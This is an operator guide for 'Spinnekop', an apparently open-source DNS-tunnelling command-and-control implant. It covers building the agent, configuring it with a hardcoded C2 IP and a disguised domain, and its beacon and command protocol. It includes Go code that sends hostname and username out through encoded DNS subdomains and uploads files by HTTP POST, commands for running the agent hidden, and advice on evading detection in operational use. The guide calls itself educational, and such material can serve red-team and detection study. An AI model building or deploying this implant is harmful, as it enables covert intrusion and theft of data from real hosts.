# Spinnekop Agent Guide

This guide covers building, configuring, and deploying the Spinnekop agent.

## Overview

The agent is a lightweight implant that:
- Beacons to the C2 server via DNS queries
- Extracts Z-value commands from DNS responses
- Executes commands (sleep, enumerate, HTTP mode)
- Exfiltrates data via DNS subdomains or HTTPS

## Build Process

### Why a Two-Step Build?

Spinnekop uses a custom build tool that:
1. Validates configuration at compile time
2. Embeds configuration as Go code (not external files)
3. Cross-compiles for multiple platforms

This approach provides:
- **OpSec**: No config files to discover on disk
- **Validation**: Catch config errors before deployment
- **Portability**: Single binary with embedded settings

### Build Tool Usage

```bash
# Build for current platform
go run ./cmd/build -target=current

# Build for specific platform
go run ./cmd/build -target=linux-amd64
go run ./cmd/build -target=windows-amd64
go run ./cmd/build -target=darwin-amd64
go run ./cmd/build -target=darwin-arm64

# Build for all platforms
go run ./cmd/build -target=all
```

### Build Output

```
🕷️🕷️🕷️ Starting Spinnekop Agent Build process 🕷️🕷️🕷️
Build: Reading YAML config from './configs/response.yaml'
Build: Configuration validated successfully
Build: Successfully wrote embedded configuration to './cmd/agent/config.go'
Build: Ran gofmt on './cmd/agent/config.go'
Build target: all common platforms
Build: Compiling agent for windows/amd64 -> ./bin/spinnekop_Agent_windows_amd64.exe
Build: Successfully built agent: ./bin/spinnekop_Agent_windows_amd64.exe
Build: Compiling agent for linux/amd64 -> ./bin/spinnekop_Agent_linux_amd64
Build: Successfully built agent: ./bin/spinnekop_Agent_linux_amd64
...
```

### Output Binaries

```
bin/
├── spinnekop_Agent_windows_amd64.exe
├── spinnekop_Agent_linux_amd64
├── spinnekop_Agent_darwin_amd64
└── spinnekop_Agent_darwin_arm64
```

## Configuration

### Agent Configuration File

Edit `configs/response.yaml` **before building**:

```yaml
resolver:
  # Use system DNS resolver or custom
  use_system_defaults: false
  ip: "143.198.3.13"      # C2 server IP
  port: 53

header:
  id: 0                    # 0 = random ID per request
  qr: false                # Query (not response)
  opcode: "QUERY"
  authoritative: false
  truncated: false
  recursion_desired: true
  recursion_available: false
  z: 0                     # Initial Z-value
  rcode: 0

question:
  name: "www.timeserversync.com."   # C2 domain
  type: "A"                          # Query type
  class: "IN"                        # Internet class
  std_class: true
```

### Configuration Options Explained

#### Resolver Section

| Field | Description | Example |
|-------|-------------|---------|
| `use_system_defaults` | Use OS DNS settings | `false` |
| `ip` | DNS server IP | `"143.198.3.13"` |
| `port` | DNS port | `53` |

**Note**: Set `use_system_defaults: false` and specify your C2 server IP directly to ensure queries go to your server, not the system resolver.

#### Header Section

| Field | Description | Typical Value |
|-------|-------------|---------------|
| `id` | Transaction ID (0 = random) | `0` |
| `qr` | Query/Response flag | `false` (query) |
| `opcode` | Operation type | `"QUERY"` |
| `recursion_desired` | Request recursion | `true` |
| `z` | Reserved bits (command) | `0` |

#### Question Section

| Field | Description | Example |
|-------|-------------|---------|
| `name` | Domain to query | `"www.timeserversync.com."` |
| `type` | Record type | `"A"`, `"TXT"` |
| `class` | Query class | `"IN"` |

## Agent Behavior

### Beacon Loop

The agent runs a continuous beacon loop:

```
┌─────────────────────────────────────────────────────────┐
│                     BEACON LOOP                          │
├─────────────────────────────────────────────────────────┤
│                                                          │
│   ┌──────────────┐                                       │
│   │ Build DNS    │                                       │
│   │ Query        │                                       │
│   └──────┬───────┘                                       │
│          │                                               │
│          ▼                                               │
│   ┌──────────────┐                                       │
│   │ Send to C2   │                                       │
│   │ Server       │                                       │
│   └──────┬───────┘                                       │
│          │                                               │
│          ▼                                               │
│   ┌──────────────┐                                       │
│   │ Extract      │                                       │
│   │ Z-Value      │                                       │
│   └──────┬───────┘                                       │
│          │                                               │
│          ▼                                               │
│   ┌──────────────┐                                       │
│   │ Dispatch     │──────────────────────────────────┐    │
│   │ Command      │                                  │    │
│   └──────┬───────┘                                  │    │
│          │                                          │    │
│          ▼                                          ▼    │
│   ┌──────────────┐                     ┌──────────────┐  │
│   │ Sleep with   │                     │ Execute      │  │
│   │ Jitter       │                     │ Command      │  │
│   └──────┬───────┘                     └──────────────┘  │
│          │                                               │
│          └────────────────────┐                          │
│                               ▼                          │
│                        [Loop continues]                  │
└─────────────────────────────────────────────────────────┘
```

### Timing Configuration

Beacon timing is controlled by constants in the agent:

```go
var Delay = 5   // Base interval in seconds
var Jitter = 50 // Jitter percentage (0-100)
```

This produces sleep intervals of:
- Minimum: `5 - (5 * 0.5) = 2.5 seconds`
- Maximum: `5 + (5 * 0.5) = 7.5 seconds`

### Z-Value Command Handling

```go
func zValueDispatcher(z int, httpMode chan<- struct{}) {
    switch z {
    case 0:
        // Continue normal beaconing
    case 1:
        // Extended sleep (1 hour)
    case 2:
        // Enable subdomain data encoding
        useRandomSubdomain = true
    case 3:
        // Switch to HTTP mode
        if httpclient.ContactServer() {
            close(httpMode)
        }
    }
}
```

## Command Responses

### Z=0: CONTINUE

No special action. Agent continues normal beacon loop.

### Z=1: SLEEP

Agent enters extended sleep:
- Duration: 1 hour (configurable)
- No network activity during sleep
- Resumes beaconing after sleep

```
⏰ Z=1 received: Sleeping for 1 hour...
```

### Z=2: ENUMERATE

Agent enables subdomain encoding:

```
Before:  www.timeserversync.com
After:   REVTS1RPUC1BQkMxMjM.timeserversync.com
         └─────────────────┘
         Base64: "DESKTOP-ABC123"
```

The subdomain contains Base64-encoded system information:
- Hostname
- Username
- Domain membership

### Z=3: HTTP_MODE

Agent switches from DNS to HTTPS:

1. Verify HTTP connectivity
2. Transfer any queued files
3. Continue HTTP beaconing

```
Switching to HTTP mode...
HTTP connection established, switching to HTTP mode
💤 HTTP mode: Sleeping for 4.23 seconds...
```

### Z=7: TERMINATE

Agent terminates cleanly:
- Stops all network activity
- Exits process

## Data Exfiltration

### DNS Subdomain Encoding

When Z=2 is active, data is encoded in subdomains:

```go
// Generate encoded subdomain
func GenerateRandom() string {
    // Collect system info
    hostname, _ := os.Hostname()
    user, _ := user.Current()
    data := hostname + "\\" + user.Username

    // Base64 encode
    encoded := base64.StdEncoding.EncodeToString([]byte(data))

    // Ensure DNS-safe (max 63 chars per label)
    if len(encoded) > 63 {
        encoded = encoded[:63]
    }

    return encoded
}
```

### HTTP File Transfer

When Z=3 triggers HTTP mode:

```go
func TransferFile() {
    // Read file to exfiltrate
    data, _ := os.ReadFile(targetFile)

    // Chunk into 64KB pieces
    for i, chunk := range splitIntoChunks(data, 65536) {
        // POST each chunk
        req, _ := http.NewRequest("POST",
            fmt.Sprintf("%s/upload?agent_id=%s&chunk=%d&total=%d",
                serverURL, agentID, i, totalChunks),
            bytes.NewReader(chunk))

        client.Do(req)
    }
}
```

## Deployment

### Pre-Deployment Checklist

1. **Configure response.yaml**
   - Set correct C2 server IP
   - Set correct C2 domain
   - Adjust timing parameters

2. **Build agent**
   ```bash
   go run ./cmd/build -target=linux-amd64
   ```

3. **Verify configuration embedded**
   - Build tool validates at compile time
   - Check for "Configuration validated successfully"

4. **Test in lab environment**
   - Run agent against test server
   - Verify beacon receipt
   - Test Z-value command handling

### Running the Agent

```bash
# Linux/macOS
./spinnekop_Agent_linux_amd64

# Windows
.\spinnekop_Agent_windows_amd64.exe
```

### Expected Output

```
--- DNS Query Packet ---
[Hex visualization of outgoing packet]

--- DNS Server Response ---
;; opcode: QUERY, status: NOERROR, id: 12345
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0

;; QUESTION SECTION:
;www.timeserversync.com.    IN    A

;; ANSWER SECTION:
www.timeserversync.com.    300    IN    A    143.198.3.13

The Z-value of 0 was received
💤 Sleeping for 4.73 seconds...
```

### Quiet Mode

To run without console output, redirect:

```bash
# Linux/macOS
./spinnekop_Agent_linux_amd64 > /dev/null 2>&1 &

# Windows PowerShell
Start-Process -WindowStyle Hidden .\spinnekop_Agent_windows_amd64.exe
```

## Troubleshooting

### Agent Not Connecting

1. **Verify network path to C2**
   ```bash
   dig @143.198.3.13 www.timeserversync.com
   ```

2. **Check firewall allows outbound DNS**
   ```bash
   # Test DNS egress
   nslookup google.com
   ```

3. **Verify configuration was embedded**
   - Check build output for validation success
   - Rebuild if config changed

### Commands Not Executing

1. **Verify Z-value extraction**
   - Enable packet dump in agent
   - Check response flags field

2. **Check server is sending commands**
   - Enable server logging
   - Verify command queue

### HTTP Mode Not Working

1. **Verify HTTP connectivity**
   ```bash
   curl http://143.198.3.13:8080/
   ```

2. **Check firewall allows HTTPS egress**

3. **Verify server HTTP handler running**

## Security Considerations

### Host Indicators

The agent creates these host artifacts:
- Running process (binary name visible)
- Network connections to C2
- DNS queries in resolver cache

### Network Indicators

- Periodic DNS queries to same domain
- High-entropy subdomains (when enumerating)
- DNS → HTTPS protocol switch
- Non-zero Z-values in responses (if captured)

### Evasion Notes

The current implementation is educational and includes:
- Visible console output
- Predictable timing patterns
- Standard binary names

For operational use, consider:
- Removing debug output
- Randomizing process names
- Variable beacon intervals
- Domain fronting

## Next Steps

- [Server Guide](server-guide.md) - Setting up the C2 server
- [Z-Value Protocol](z-value-protocol.md) - Command protocol details
- [Detection Guide](detection-guide.md) - Understanding detection methods
